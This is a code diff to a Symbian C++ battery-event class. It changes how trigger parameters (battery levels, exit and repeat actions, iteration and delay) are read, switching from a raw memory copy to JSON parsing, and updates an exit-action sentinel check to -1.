@@ -6,6 +6,7 @@
  */
 
 #include "EventBattery.h"
+#include "Json.h"
 
 CEventBattery::CEventBattery(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Battery, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
@@ -42,8 +43,58 @@ void CEventBattery::ConstructL(const TDesC8& params)
 	__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
-	Mem::Copy(&iBatteryParams, iParams.Ptr(), sizeof(iBatteryParams));
 	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve levels
+		rootObject->GetIntL(_L("max"),iBatteryParams.iMaxlevel);
+		rootObject->GetIntL(_L("min"),iBatteryParams.iMinLevel);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iBatteryParams.iExitAction);
+			}
+		else
+			iBatteryParams.iExitAction = -1;
+			
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iBatteryParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iBatteryParams.iIter);
+			rootObject->GetIntL(_L("delay"),iBatteryParams.iDelay);
+			}
+		else
+			{
+			iBatteryParams.iRepeatAction = -1;
+			iBatteryParams.iIter = 0;
+			iBatteryParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	// just to be sure, but Console also check it:
 	if(iBatteryParams.iMinLevel > iBatteryParams.iMaxlevel)
 		return;
@@ -109,7 +160,7 @@ void CEventBattery::HandlePhoneEventL(TPhoneFunctions event)
 			{
 			iWasInRange = EFalse;
 			// Triggers the unplug action
-			if (iBatteryParams.iExitAction != 0xFFFFFFFF)
+			if (iBatteryParams.iExitAction != -1)
 				{
 				SendActionTriggerToCoreL(iBatteryParams.iExitAction);
 				}
